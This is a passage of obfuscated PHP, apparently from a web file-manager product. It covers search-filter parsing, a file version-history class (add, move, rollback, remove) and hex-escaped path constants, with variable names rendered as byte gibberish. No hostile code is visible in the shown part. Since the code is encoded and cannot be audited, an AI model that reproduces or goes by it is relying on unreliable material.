$‚âåÎÕ) { $šÁ¸ğÁÛ[$×§éŞ“Ò[447] . $„Ã‘Ìß³] = $‚âåÎÕ; } foreach ($ØÓÇÑ„¶ as $–Ö Ô–Å) { $šÁ¸ğÁÛ[] = array($×§éŞ“Ò[452] => $–Ö Ô–Å, $×§éŞ“Ò[999] => $×§éŞ“Ò[1925], array($×§éŞ“Ò[2088] => $–Ö Ô–Å, $×§éŞ“Ò[2089] => array($×§éŞ“Ò[7], array($×§éŞ“Ò[474], $×§éŞ“Ò[473])))); } $this->join($ù±œ³); $¾µÒ–è™ = $šÁ¸ğÁÛ; } private function _parseSearchWhere($¤ĞŸ­±ç) { $Æùõğ˜æ =& $_SERVER[„Ç©ñÎ©]; $¼ÏÃ¾‹¶ = array(); if (isset($¤ĞŸ­±ç[$Æùõğ˜æ[764]]) && $¤ĞŸ­±ç[$Æùõğ˜æ[764]]) { $¼ÏÃ¾‹¶[$Æùõğ˜æ[95]] = array($Æùõğ˜æ[2090], $¤ĞŸ­±ç[$Æùõğ˜æ[764]]); } if (isset($¤ĞŸ­±ç[$Æùõğ˜æ[506]]) && $¤ĞŸ­±ç[$Æùõğ˜æ[506]]) { $µ×Íşİô = array($Æùõğ˜æ[2091], $¤ĞŸ­±ç[$Æùõğ˜æ[506]]); if ($¼ÏÃ¾‹¶[$Æùõğ˜æ[95]]) { $¼ÏÃ¾‹¶[$Æùõğ˜æ[95]] = array($¼ÏÃ¾‹¶[$Æùõğ˜æ[95]], $µ×Íşİô, $Æùõğ˜æ[2092]); } else { $¼ÏÃ¾‹¶[$Æùõğ˜æ[95]] = $µ×Íşİô; } } if (isset($¤ĞŸ­±ç[$Æùõğ˜æ[2084]]) && $¤ĞŸ­±ç[$Æùõğ˜æ[2084]] > 0) { $¼ÏÃ¾‹¶[$Æùõğ˜æ[86]] = array($Æùõğ˜æ[2090], $¤ĞŸ­±ç[$Æùõğ˜æ[2084]]); } if (isset($¤ĞŸ­±ç[$Æùõğ˜æ[2085]]) && $¤ĞŸ­±ç[$Æùõğ˜æ[2085]]) { $µ×Íşİô = array($Æùõğ˜æ[2091], $¤ĞŸ­±ç[$Æùõğ˜æ[2085]]); if ($¼ÏÃ¾‹¶[$Æùõğ˜æ[86]]) { $¼ÏÃ¾‹¶[$Æùõğ˜æ[86]] = array($¼ÏÃ¾‹¶[$Æùõğ˜æ[86]], $µ×Íşİô, $Æùõğ˜æ[2092]); } else { $¼ÏÃ¾‹¶[$Æùõğ˜æ[86]] = $µ×Íşİô; } } if (isset($¤ĞŸ­±ç[$Æùõğ˜æ[609]]) && $¤ĞŸ­±ç[$Æùõğ˜æ[609]]) { $¼ÏÃ¾‹¶[] = array($Æùõğ˜æ[465] => $¤ĞŸ­±ç[$Æùõğ˜æ[609]], $Æùõğ˜æ[463] => $¤ĞŸ­±ç[$Æùõğ˜æ[609]], $Æùõğ˜æ[999] => $Æùõğ˜æ[1925]); } if (isset($¤ĞŸ­±ç[$Æùõğ˜æ[421]]) && $¤ĞŸ­±ç[$Æùõğ˜æ[421]]) { $Àº¥ = $¤ĞŸ­±ç[$Æùõğ˜æ[421]]; if ($Àº¥ == $Æùõğ˜æ[85]) { $¼ÏÃ¾‹¶[$Æùõğ˜æ[419]] = 1; } else { if ($Àº¥ == $Æùõğ˜æ[2093]) { $¼ÏÃ¾‹¶[$Æùõğ˜æ[419]] = 0; } else { if ($Àº¥) { $Àº¥ = is_array($Àº¥) ? $Àº¥ : explode($Æùõğ˜æ[50], $Àº¥); $¼ÏÃ¾‹¶[$Æùõğ˜æ[421]] = array($Æùõğ˜æ[427], $Àº¥); $¼ÏÃ¾‹¶[$Æùõğ˜æ[419]] = 0; } } } } $this->_parseSearchParent($¤ĞŸ­±ç, $¼ÏÃ¾‹¶); if (isset($¤ĞŸ­±ç[$Æùõğ˜æ[1921]]) && trim($¤ĞŸ­±ç[$Æùõğ˜æ[1921]])) { $Á‰äşáñ = trim($¤ĞŸ­±ç[$Æùõğ˜æ[1921]]); $ŠØÅÃ‰­ = explode($Æùõğ˜æ[53], $Á‰äşáñ); if (strlen($Á‰äşáñ) > 2 && (substr($Á‰äşáñ, 0, 1) == $Æùõğ˜æ[128] && substr($Á‰äşáñ, -1) == $Æùõğ˜æ[128]) || substr($Á‰äşáñ, 0, 1) == $Æùõğ˜æ[58] && substr($Á‰äşáñ, -1) == $Æùõğ˜æ[58]) { $Á‰äşáñ = substr($Á‰äşáñ, 1, -1); $ŠØÅÃ‰­ = array($Á‰äşáñ); } $¼ÏÃ¾‹¶[$Æùõğ˜æ[32]] = array(array($Æùõğ˜æ[559], $Æùõğ˜æ[1923] . $Á‰äşáñ . $Æùõğ˜æ[1923])); if (count($ŠØÅÃ‰­) > 1) { $¼ÏÃ¾‹¶[$Æùõğ˜æ[32]] = array(); foreach ($ŠØÅÃ‰­ as $†ÔæîÚä) { if (!trim($†ÔæîÚä)) { continue; } $¼ÏÃ¾‹¶[$Æùõğ˜æ[32]][] = array($Æùõğ˜æ[559], $Æùõğ˜æ[1923] . trim($†ÔæîÚä) . $Æùõğ˜æ[1923]); } } } return $¼ÏÃ¾‹¶; } private function _parseSearchParent($ÙÅ·˜¨À, &$—„“à) { $œÏ­­ =& $_SERVER[„Ç©ñÎ©]; if (!isset($ÙÅ·˜¨À[$œÏ­­[441]]) || !$ÙÅ·˜¨À[$œÏ­­[441]]) { return; } $ôº½Ú¹Ñ = $this->pathInfo($ÙÅ·˜¨À[$œÏ­­[441]]); $„ˆ‹´Âá = $ôº½Ú¹Ñ[$œÏ­­[441]] . $œÏ­­[12] === $œÏ­­[207]; $Ú„µ€Ö› = $ôº½Ú¹Ñ[$œÏ­­[420]] == $œÏ­­[524]; if ($ôº½Ú¹Ñ[$œÏ­­[541]] == $œÏ­­[542]) { $ò“Öê´Æ = $this->sourceInfo($ÙÅ·˜¨À[$œÏ­­[441]]); $ôº½Ú¹Ñ[$œÏ­­[530]] = $ò“Öê´Æ[$œÏ­­[530]]; } $—„“à[$œÏ­­[599]] = array($œÏ­­[559], $ôº½Ú¹Ñ[$œÏ­­[530]] . $ÙÅ·˜¨À[$œÏ­­[441]] . $œÏ­­[560]); $‘ÃÅ¬¦Â = isset($ÙÅ·˜¨À[$œÏ­­[1786]]) && in_array($œÏ­­[524], $ÙÅ·˜¨À[$œÏ­­[1786]]); if (!$‘ÃÅ¬¦Â || !$Ú„µ€Ö› || !$„ˆ‹´Âá || !$ôº½Ú¹Ñ[$œÏ­­[422]]) { return; } if (!AuthModel::authCheckRoot($ôº½Ú¹Ñ[$œÏ­­[422]][$œÏ­­[423]])) { return; } $üÉíÔ²ì = $ôº½Ú¹Ñ[$œÏ­­[514]] . $œÏ­­[12]; if ($üÉíÔ²ì == $œÏ­­[98]) { unset($—„“à[$œÏ­­[599]]); $—„“à[$œÏ­­[420]] = self::TYPE_GROUP; return; } $ˆª¼ìŞ = Model($œÏ­­[531])->groupChildrenAll($üÉíÔ²ì); $ÍÏÒ‰–û = count($ˆª¼ìŞ); if ($ÍÏÒ‰–û <= 1) { return; } $‹¢¼¯Üâ = array($œÏ­­[441] => 0, $œÏ­­[420] => self::TYPE_GROUP, $œÏ­­[514] => array($œÏ­­[7], $ˆª¼ìŞ)); $ıŒ¾Ô¹ü = $this->field($œÏ­­[2094])->where($‹¢¼¯Üâ)->limit($ÍÏÒ‰–û)->select(); $—„“à[$œÏ­­[599]] = array(); foreach ($ıŒ¾Ô¹ü as $èäëè“ì) { $—„“à[$œÏ­­[599]][] = array($œÏ­­[559], $œÏ­­[540] . $èäëè“ì[$œÏ­­[411]] . $œÏ­­[560]); } $—„“à[$œÏ­­[599]][] = $œÏ­­[1925]; } } goto b‹µ„Ö”É; F¡›‹ŠÏ¤†: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $‰á‰ç¶¤ =& $_SERVER[„Ç©ñÎ©]; $Øª·ìßš = $GLOBALS[$‰á‰ç¶¤[6]][$‰á‰ç¶¤[99]]; if ($Øª·ìßš[$‰á‰ç¶¤[1207]] != 1) { return; } if ($Øª·ìßš[$‰á‰ç¶¤[1208]] <= 0) { return; } if (isset($_REQUEST[$‰á‰ç¶¤[1209]]) && $_REQUEST[$‰á‰ç¶¤[1209]] == $‰á‰ç¶¤[98]) { return; } Hook::bind($‰á‰ç¶¤[1210], $‰á‰ç¶¤[1211]); Hook::bind($‰á‰ç¶¤[1212], $‰á‰ç¶¤[1213]); Hook::bind($‰á‰ç¶¤[1214], $‰á‰ç¶¤[1215]); Hook::bind($‰á‰ç¶¤[1216], $‰á‰ç¶¤[1217]); Hook::bind($‰á‰ç¶¤[1218], $‰á‰ç¶¤[1219]); Hook::bind($‰á‰ç¶¤[1220], $‰á‰ç¶¤[1221]); } public static function eventBeforeUpload($¸Œ­ôö™) { if ($¸Œ­ôö™[3] && $¸Œ­ôö™[3] != REPEAT_REPLACE) { return; } $Ç‚ÊÎªÃ = self::parsePath($¸Œ­ôö™[0]); if (!$Ç‚ÊÎªÃ) { return; } self::add($Ç‚ÊÎªÃ); } public static function eventBeforeEdit($Ê¤”Á…) { $•±¬Ô¼Ò = self::parsePath($Ê¤”Á…[0]); if (!$•±¬Ô¼Ò) { return; } self::add($•±¬Ô¼Ò); } public static function eventBeforeCopyFile($­ˆÖŒª, $éû˜Œ§Î, $è íñÁ, $Å”¦óÇè, $Å—æÏœÈ, $°ŞÌ¿í¦) { $ÔåøĞ™ =& $_SERVER[„Ç©ñÎ©]; if (isset($è íñÁ->_data[$ÔåøĞ™[1154]]) && $è íñÁ->_data[$ÔåøĞ™[1154]]) { return; } $ Ğ¿Û©ú = $è íñÁ->getPathOuter($Å”¦óÇè); $§óëËª = self::parsePath($ Ğ¿Û©ú); if (!$§óëËª) { return; } self::add($§óëËª); } public static function eventBeforeRename($¯É»ø÷) { $ÀĞ¡´³œ =& $_SERVER[„Ç©ñÎ©]; $¨õ½ÖìÅ = self::parsePath($¯É»ø÷[0]); if (!$¨õ½ÖìÅ) { return; } $Ùá»ÜÆô = self::checkInHistory($¨õ½ÖìÅ); if (!$Ùá»ÜÆô) { return; } if ($Ùá»ÜÆô[$ÀĞ¡´³œ[33]] == $ÀĞ¡´³œ[209]) { $à•¡”­ô = self::listData($¨õ½ÖìÅ); if ($à•¡”­ô && $à•¡”­ô[$ÀĞ¡´³œ[378]]) { self::moveHistory($¨õ½ÖìÅ, $¯É»ø÷[1]); } } else { IO::rename($Ùá»ÜÆô[$ÀĞ¡´³œ[94]], $¯É»ø÷[1]); } } public static function eventBeforeMove($Øİ¡—É‰) { $œ‘­µş =& $_SERVER[„Ç©ñÎ©]; $§ÚÇÚ = self::parsePath($Øİ¡—É‰[0]); if (!$§ÚÇÚ) { return; } $ÌÚİ“©ò = self::parsePath($Øİ¡—É‰[1]); if (!$ÌÚİ“©ò) { return; } $¹‚ÙúÉ = $Øİ¡—É‰[3]; $¬Ğ‚¹ÀÂ = self::checkInHistory($§ÚÇÚ); if (!$¬Ğ‚¹ÀÂ) { return; } $õ¨Ğ‚±Á = self::pathHistory($ÌÚİ“©ò); if ($¬Ğ‚¹ÀÂ[$œ‘­µş[33]] == $œ‘­µş[209]) { $ô–¯¡¯ = self::listData($§ÚÇÚ); $ô²ÁêÊÆ = rtrim($ÌÚİ“©ò, $œ‘­µş[8]) . $œ‘­µş[8] . ($¹‚ÙúÉ ? $¹‚ÙúÉ : get_path_this($§ÚÇÚ)); $¥ÁÂ“ì = self::listData($ô²ÁêÊÆ); if ($ô–¯¡¯ && $ô–¯¡¯[$œ‘­µş[378]] && $¥ÁÂ“ì && $¥ÁÂ“ì[$œ‘­µş[378]]) { return self::clear($§ÚÇÚ); } if ($ô–¯¡¯ && $ô–¯¡¯[$œ‘­µş[378]]) { self::moveHistory($§ÚÇÚ, $¹‚ÙúÉ, $õ¨Ğ‚±Á); } } else { IO::move($¬Ğ‚¹ÀÂ[$œ‘­µş[94]], $õ¨Ğ‚±Á, !1, $¹‚ÙúÉ); self::clearEmptyFolder(IO::pathFather($¬Ğ‚¹ÀÂ[$œ‘­µş[94]])); } } public static function eventAfterRemove($ùÑ»æÌ, $µµÂ„) { $ÈğÓ—Œ¢ =& $_SERVER[„Ç©ñÎ©]; if (!$µµÂ„) { return; } $ì¹ñõÑ¦ = self::parsePath($ùÑ»æÌ[0]); if (!$ì¹ñõÑ¦) { return; } $§–È©ØÀ = self::checkInHistory($ì¹ñõÑ¦); if (!$§–È©ØÀ) { return; } if ($§–È©ØÀ[$ÈğÓ—Œ¢[33]] == $ÈğÓ—Œ¢[209]) { $ÀşŒÛ¬ = self::listData($ì¹ñõÑ¦, !1); if ($ÀşŒÛ¬ && $ÀşŒÛ¬[$ÈğÓ—Œ¢[378]]) { self::clear($ì¹ñõÑ¦, !1); } } else { IO::remove($§–È©ØÀ[$ÈğÓ—Œ¢[94]]); self::clearEmptyFolder(IO::pathFather($§–È©ØÀ[$ÈğÓ—Œ¢[94]])); } } private static function checkInHistory($æüÈøıÆ) { $Æˆ™ƒ®ú = self::pathHistory($æüÈøıÆ); if (!IO::exist($Æˆ™ƒ®ú)) { $Æˆ™ƒ®ú .= $_SERVER[„Ç©ñÎ©][1222]; } return IO::exist($Æˆ™ƒ®ú) ? IO::info($Æˆ™ƒ®ú) : !1; } private static function parsePath($‚§îŸõÊ) { $Èë©»õ× =& $_SERVER[„Ç©ñÎ©]; if (!$‚§îŸõÊ) { return !1; } if ($GLOBALS[$Èë©»õ×[1223]]) { return; } $ƒ±í¢ÚÛ = KodIO::parse($‚§îŸõÊ); $ëŒğÊÜÅ = $ƒ±í¢ÚÛ[$Èë©»õ×[33]]; $Í­—«œÖ = !$ëŒğÊÜÅ || $ëŒğÊÜÅ == KodIO::KOD_IO || $ëŒğÊÜÅ == KodIO::KOD_SHARE_ITEM; if (!$Í­—«œÖ || !$ƒ±í¢ÚÛ[$Èë©»õ×[1224]]) { return !1; } if (substr($‚§îŸõÊ, 0, strlen(DATA_PATH . $Èë©»õ×[1225])) == DATA_PATH . $Èë©»õ×[1225]) { return !1; } if ($ëŒğÊÜÅ == KodIO::KOD_SHARE_ITEM) { $¦úğ¬“³ = IO::init($‚§îŸõÊ); if ($¦úğ¬“³->pathParse[$Èë©»õ×[1150]]) { return self::parsePath($¦úğ¬“³->pathParse[$Èë©»õ×[1150]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $™â¾ÙéÉ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Èë©»õ×[1226]); foreach ($™â¾ÙéÉ as $ÕÚüë¥—) { if (!$ëŒğÊÜÅ && substr($‚§îŸõÊ, 0, strlen($ÕÚüë¥—)) == $ÕÚüë¥—) { return !1; } } self::log($GLOBALS[$Èë©»õ×[1145]] . $Èë©»õ×[1227] . $‚§îŸõÊ); return $‚§îŸõÊ; } private static function pathHistory($·ÛÕøĞ®) { $¬¿ÁĞË =& $_SERVER[„Ç©ñÎ©]; $Ğ¸¿úè‘ = self::$_historyBase . ltrim(KodIO::clear($·ÛÕøĞ®), $¬¿ÁĞË[8]); $Ğ¸¿úè‘ = str_replace(array($¬¿ÁĞË[1228]), array($¬¿ÁĞË[1229]), $Ğ¸¿úè‘); return $Ğ¸¿úè‘; } public static function log($õœ¯Û¼) { } public static function historyCount($‹Ã°Âá) { $Äô­•£¡ =& $_SERVER[„Ç©ñÎ©]; $ª¸®¸‹¤ = array(); $§·øÅÔ = array(); foreach ($‹Ã°Âá as $´Îï¢û×) { $ÒïÊş‘ = get_path_father($´Îï¢û×); if (!$§·øÅÔ[$ÒïÊş‘]) { $§·øÅÔ[$ÒïÊş‘] = array(); } $§·øÅÔ[$ÒïÊş‘][] = get_path_this($´Îï¢û×); } foreach ($§·øÅÔ as $ÒïÊş‘ => $ìšîÀª) { $ö¦·–›– = self::parsePath($ÒïÊş‘); if (!$ö¦·–›–) { continue; } foreach ($ìšîÀª as $õÍŞµöñ) { $¬¹¥¦Şù = self::listData(rtrim($ö¦·–›–, $Äô­•£¡[8]) . $Äô­•£¡[8] . $õÍŞµöñ, !1); if ($¬¹¥¦Şù && $¬¹¥¦Şù[$Äô­•£¡[378]]) { $ª¸®¸‹¤[rtrim($ÒïÊş‘, $Äô­•£¡[8]) . $Äô­•£¡[8] . $õÍŞµöñ] = count($¬¹¥¦Şù[$Äô­•£¡[378]]); } } } return $ª¸®¸‹¤; } public static function add($ Ö£¸Ú¬) { $Øìå÷·Û =& $_SERVER[„Ç©ñÎ©]; $ïÊÍû‘– = self::listData($ Ö£¸Ú¬); if (!$ïÊÍû‘–) { return; } $ëğ ×Ø— = Model($Øìå÷·Û[773])->get($Øìå÷·Û[1230]); $ãÌÁĞ¢´ = $GLOBALS[$Øìå÷·Û[6]][$Øìå÷·Û[99]][$Øìå÷·Û[1208]]; $ƒ­éÛÑ« = $ëğ ×Ø— == $Øìå÷·Û[1231] ? min(5, $ãÌÁĞ¢´) : $ãÌÁĞ¢´; if ($ãÌÁĞ¢´ <= 0) { return; } $§ÊôŒÁ = IO::info($ Ö£¸Ú¬); $í¡¤Ô‡ = $ïÊÍû‘–[$Øìå÷·Û[378]]; if ($§ÊôŒÁ[$Øìå÷·Û[86]] == 0) { return; } if ($§ÊôŒÁ[$Øìå÷·Û[86]] >= 1024 * 1024 * 500) { return !1; } $È±Ã÷î® = IO::hashSimple($ Ö£¸Ú¬); if ($í¡¤Ô‡ && $í¡¤Ô‡[0][$Øìå÷·Û[187]] == $È±Ã÷î®) { return !0; } if (array_key_exists($Øìå÷·Û[212], $§ÊôŒÁ) && !$§ÊôŒÁ[$Øìå÷·Û[212]]) { return !1; } $¨èÁÈ—é = short_id(time()); $áÜ‘Œİ¤ = array($Øìå÷·Û[408] => $¨èÁÈ—é, $Øìå÷·Û[187] => $È±Ã÷î®, $Øìå÷·Û[32] => $§ÊôŒÁ[$Øìå÷·Û[32]] . $Øìå÷·Û[10] . date($Øìå÷·Û[1232]) . rand_string(1), $Øìå÷·Û[86] => $§ÊôŒÁ[$Øìå÷·Û[86]], $Øìå÷·Û[463] => USER_ID, $Øìå÷·Û[210] => time(), $Øìå÷·Û[1233] => $Øìå÷·Û[12]); IO::mkdir($ïÊÍû‘–[$Øìå÷·Û[1234]]); $Ãş¨¤Ëó = IO::copy($ Ö£¸Ú¬, $ïÊÍû‘–[$Øìå÷·Û[1234]], !1, $áÜ‘Œİ¤[$Øìå÷·Û[32]]); if (!$Ãş¨¤Ëó) { self::clearEmptyFolder($ïÊÍû‘–[$Øìå÷·Û[1234]]); return !1; } array_unshift($í¡¤Ô‡, $áÜ‘Œİ¤); if (count($í¡¤Ô‡) > $ƒ­éÛÑ«) { $Å¦™ïÊ = array_slice($í¡¤Ô‡, $ƒ­éÛÑ«); foreach ($Å¦™ïÊ as $–Ÿô¤”Ø) { IO::remove($ïÊÍû‘–[$Øìå÷·Û[1234]] . $–Ÿô¤”Ø[$Øìå÷·Û[32]]); } $í¡¤Ô‡ = array_slice($í¡¤Ô‡, 0, $ƒ­éÛÑ«); } return self::saveData($ïÊÍû‘–[$Øìå÷·Û[1235]], $í¡¤Ô‡); } public static function remove($„ï¦¤µİ, $ğ¥» Šğ) { $Øï”»ÀÊ =& $_SERVER[„Ç©ñÎ©]; $Ñø§´Œ = self::listData($„ï¦¤µİ); $ŞĞ¨Œ×é = array(); if (!$Ñø§´Œ) { return !1; } foreach ($Ñø§´Œ[$Øï”»ÀÊ[378]] as $ä‚³³ö) { if ($ä‚³³ö[$Øï”»ÀÊ[408]] == $ğ¥» Šğ) { IO::remove($Ñø§´Œ[$Øï”»ÀÊ[1234]] . $ä‚³³ö[$Øï”»ÀÊ[32]]); continue; } $ŞĞ¨Œ×é[] = $ä‚³³ö; } return self::saveData($Ñø§´Œ[$Øï”»ÀÊ[1235]], $ŞĞ¨Œ×é); } public static function clear($ŞıØÅâÆ, $…¼¯ÇÃ• = true) { $–ßäÌà =& $_SERVER[„Ç©ñÎ©]; $¾‘åî³Š = self::listData($ŞıØÅâÆ, $…¼¯ÇÃ•); if (!$¾‘åî³Š) { return !1; } foreach ($¾‘åî³Š[$–ßäÌà[378]] as $¼ËÙÅ­Ï) { IO::remove($¾‘åî³Š[$–ßäÌà[1234]] . $¼ËÙÅ­Ï[$–ßäÌà[32]]); } return self::saveData($¾‘åî³Š[$–ßäÌà[1235]], array()); } public static function moveHistory($À›Ÿ÷Üß, $Æ‰õÔÆ = '', $ĞäÑ˜èê = '') { $æ‹²‚™ =& $_SERVER[„Ç©ñÎ©]; $”“ºÏÇ» = self::listData($À›Ÿ÷Üß, !1); if (!$”“ºÏÇ» || !$”“ºÏÇ»[$æ‹²‚™[378]]) { return !1; } $ó¢›Õîû = $æ‹²‚™[1222]; $Æ‰õÔÆ = $Æ‰õÔÆ ? $Æ‰õÔÆ : get_path_this($À›Ÿ÷Üß); $ĞäÑ˜èê = $ĞäÑ˜èê ? $ĞäÑ˜èê : $”“ºÏÇ»[$æ‹²‚™[1234]]; $‘Ñ¶©—ˆ = substr(get_path_this($”“ºÏÇ»[$æ‹²‚™[1235]]), 0, -strlen($ó¢›Õîû)); foreach ($”“ºÏÇ»[$æ‹²‚™[378]] as $¾é‡Š”¶ => $µšä©äÕ) { $¹æÌîôë = $Æ‰õÔÆ . substr($µšä©äÕ[$æ‹²‚™[32]], strlen($‘Ñ¶©—ˆ)); $¾èÃ¹çÇ = IO::move($”“ºÏÇ»[$æ‹²‚™[1234]] . $µšä©äÕ[$æ‹²‚™[32]], $ĞäÑ˜èê, !1, $¹æÌîôë); if ($¾èÃ¹çÇ) { $”“ºÏÇ»[$æ‹²‚™[378]][$¾é‡Š”¶][$æ‹²‚™[32]] = $¹æÌîôë; } } $”“ºÏÇ»[$æ‹²‚™[1235]] = IO::move($”“ºÏÇ»[$æ‹²‚™[1235]], $ĞäÑ˜èê, !1, $Æ‰õÔÆ . $ó¢›Õîû); self::saveData($”“ºÏÇ»[$æ‹²‚™[1235]], $”“ºÏÇ»[$æ‹²‚™[378]]); self::clearEmptyFolder($”“ºÏÇ»[$æ‹²‚™[1234]]); } public static function rollback($›ñÔüå³, $àÇ§ßà‡) { $›æêµĞ« =& $_SERVER[„Ç©ñÎ©]; $“à´ãåŸ = self::listData($›ñÔüå³); if (!$“à´ãåŸ) { return; } $£ó¿ùûÈ = IO::info($›ñÔüå³); foreach ($“à´ãåŸ[$›æêµĞ«[378]] as $Œ—ı®• => $¤ŠÓÛªŞ) { if ($¤ŠÓÛªŞ[$›æêµĞ«[408]] == $àÇ§ßà‡) { self::add($›ñÔüå³); $€×Ïíğ™ = $“à´ãåŸ[$›æêµĞ«[1234]] . $¤ŠÓÛªŞ[$›æêµĞ«[32]]; $äà§”‚ë = IO::copy($€×Ïíğ™, IO::pathFather($›ñÔüå³), REPEAT_REPLACE, $£ó¿ùûÈ[$›æêµĞ«[32]]); if ($äà§”‚ë) { self::remove($›ñÔüå³, $àÇ§ßà‡); } return $äà§”‚ë; } } return !1; } public static function setDetail($Ø‡™ÚÙø, $šŒ»ò°ã, $ä®´Ç¢) { $¡„›¡ÍÁ =& $_SERVER[„Ç©ñÎ©]; $²´ÒÕÚø = self::listData($Ø‡™ÚÙø); if (!$²´ÒÕÚø) { return; } foreach ($²´ÒÕÚø[$¡„›¡ÍÁ[378]] as $ŸÌ÷¼Ğú => $Ä«ïì†) { if ($Ä«ïì†[$¡„›¡ÍÁ[408]] == $šŒ»ò°ã) { $²´ÒÕÚø[$¡„›¡ÍÁ[378]][$ŸÌ÷¼Ğú][$¡„›¡ÍÁ[1233]] = $ä®´Ç¢; self::saveData($²´ÒÕÚø[$¡„›¡ÍÁ[1235]], $²´ÒÕÚø[$¡„›¡ÍÁ[378]]); return !0; } } return !1; } public static function fileInfo($ÛŞü™Ó€, $¨›±ÖÚï) { $¨çÃ¶É­ =& $_SERVER[„Ç©ñÎ©]; $¦×ì«÷ = self::listData($ÛŞü™Ó€); if (!$¦×ì«÷) { show_json(LNG($¨çÃ¶É­[115]), !1); } $×ºÊ‡ÚŠ = $¨çÃ¶É­[12]; foreach ($¦×ì«÷[$¨çÃ¶É­[378]] as $å¶âÈ‘É => $ë·Äœ´—) { if ($ë·Äœ´—[$¨çÃ¶É­[408]] != $¨›±ÖÚï) { continue; } $×ºÊ‡ÚŠ = $¦×ì«÷[$¨çÃ¶É­[1234]] . $ë·Äœ´—[$¨çÃ¶É­[32]]; break; } if (!$×ºÊ‡ÚŠ) { show_json(LNG($¨çÃ¶É­[115]), !1); } return IO::info($×ºÊ‡ÚŠ); } public static function fileOut($”‡²Ë¼á, $•ÊÍ‡ìù, $Çğ÷ßŒ» = false) { $’ıŒîÃ§ =& $_SERVER[„Ç©ñÎ©]; $¾ìôÜ² = self::fileInfo($”‡²Ë¼á, $•ÊÍ‡ìù); $­µÙİ´ =& $GLOBALS[$’ıŒîÃ§[7]]; $Çğ÷ßŒ» = isset($­µÙİ´[$’ıŒîÃ§[1198]]) && $­µÙİ´[$’ıŒîÃ§[1198]] == 1; if (isset($­µÙİ´[$’ıŒîÃ§[33]]) && $­µÙİ´[$’ıŒîÃ§[33]] == $’ıŒîÃ§[1236]) { return IO::fileOutImage($¾ìôÜ²[$’ıŒîÃ§[94]], $­µÙİ´[$’ıŒîÃ§[1237]]); } IO::fileOut($¾ìôÜ²[$’ıŒîÃ§[94]], $Çğ÷ßŒ», get_path_this($”‡²Ë¼á)); } public static function listData($ß¼îïæ, $±³Õêˆ = true) { $èÂ¹­¿‰ =& $_SERVER[„Ç©ñÎ©]; if ($±³Õêˆ && !IO::exist($ß¼îïæ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ß¼îïæ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $„¿ÒÙ³ = self::pathHistory($ß¼îïæ); $ş‹ˆéÎí = array($èÂ¹­¿‰[1235] => $„¿ÒÙ³ . $èÂ¹­¿‰[1222], $èÂ¹­¿‰[1234] => rtrim(get_path_father($„¿ÒÙ³), $èÂ¹­¿‰[8]) . $èÂ¹­¿‰[8], $èÂ¹­¿‰[378] => array()); $»½ñ‰üç = IO::getContent($ş‹ˆéÎí[$èÂ¹­¿‰[1235]]); if ($»½ñ‰üç) { $ï–¸ßĞ = json_decode($»½ñ‰üç, !0); if (is_array($ï–¸ßĞ)) { $ş‹ˆéÎí[$èÂ¹­¿‰[378]] = $ï–¸ßĞ; } } return $ş‹ˆéÎí; } private static function saveData($âã¥Ÿ Ä, $ îÑ€îÏ) { $°†‰ãšò =& $_SERVER[„Ç©ñÎ©]; self::log($°†‰ãšò[1238] . $âã¥Ÿ Ä . $°†‰ãšò[81] . count($ îÑ€îÏ), $°†‰ãšò[755]); if ($ îÑ€îÏ) { return IO::setContent($âã¥Ÿ Ä, json_encode($ îÑ€îÏ)); } $ß²Ò²Üè = IO::pathFather($âã¥Ÿ Ä); IO::remove($âã¥Ÿ Ä); self::clearEmptyFolder($ß²Ò²Üè); return !0; } public static function clearEmptyFolder($¸»·óß) { $š»îÄóÆ =& $_SERVER[„Ç©ñÎ©]; if (trim($¸»·óß, $š»îÄóÆ[8]) == trim(self::$_historyBase, $š»îÄóÆ[8])) { return; } $Ã²†©ˆ = IO::pathFather($¸»·óß); $¥Ñ„¯ = IO::has($¸»·óß, !0); if ($¥Ñ„¯[$š»îÄóÆ[217]] > 0 || $¥Ñ„¯[$š»îÄóÆ[218]] > 0) { return; } IO::remove($¸»·óß); self::clearEmptyFolder($Ã²†©ˆ); } private static function getBasePath() { $Æşâëûö =& $_SERVER[„Ç©ñÎ©]; $‡ÆÚšÂø = Model($Æşâëûö[1239])->get($Æşâëûö[1240]); if ($‡ÆÚšÂø) { if (!IO::exist($‡ÆÚšÂø)) { IO::mkdir($‡ÆÚšÂø); } if (get_path_this($‡ÆÚšÂø) == $Æşâëûö[1225]) { $‹‡»İ×ç = $Æşâëûö[1241] . rand_string(8); @rename($‡ÆÚšÂø, get_path_father($‡ÆÚšÂø) . $Æşâëûö[8] . $‹‡»İ×ç); $‡ÆÚšÂø = DATA_PATH . $‹‡»İ×ç . $Æşâëûö[8]; file_put_contents(DATA_PATH . $Æşâëûö[1242], $Æşâëûö[12]); Model($Æşâëûö[1239])->set($Æşâëûö[1240], $‡ÆÚšÂø); } return $‡ÆÚšÂø; } $‡ÆÚšÂø = DATA_PATH . $Æşâëûö[1241] . rand_string(8) . $Æşâëûö[8]; $‡ÆÚšÂø = IO::mkdir($‡ÆÚšÂø); $‡ÆÚšÂø = rtrim($‡ÆÚšÂø, $Æşâëûö[8]) . $Æşâëûö[8]; file_put_contents($‡ÆÚšÂø . $Æşâëûö[1242], $Æşâëûö[12]); file_put_contents(DATA_PATH . $Æşâëûö[1242], $Æşâëûö[12]); Model($Æşâëûö[1239])->set($Æşâëûö[1240], $‡ÆÚšÂø); return $‡ÆÚšÂø; } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\145\162\x52\x65\x63\x79\143\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\x73\145\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\x72\106\151\x6c\145\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\162\x46\151\x6c\145\x54\x79\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\165\160\x52\x6f\x6f\164\123\145\154\146\175"; const KOD_USER_SHARE = "\173\165\x73\145\162\x53\x68\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\x72\123\x68\141\x72\145\114\x69\x6e\153\175"; const 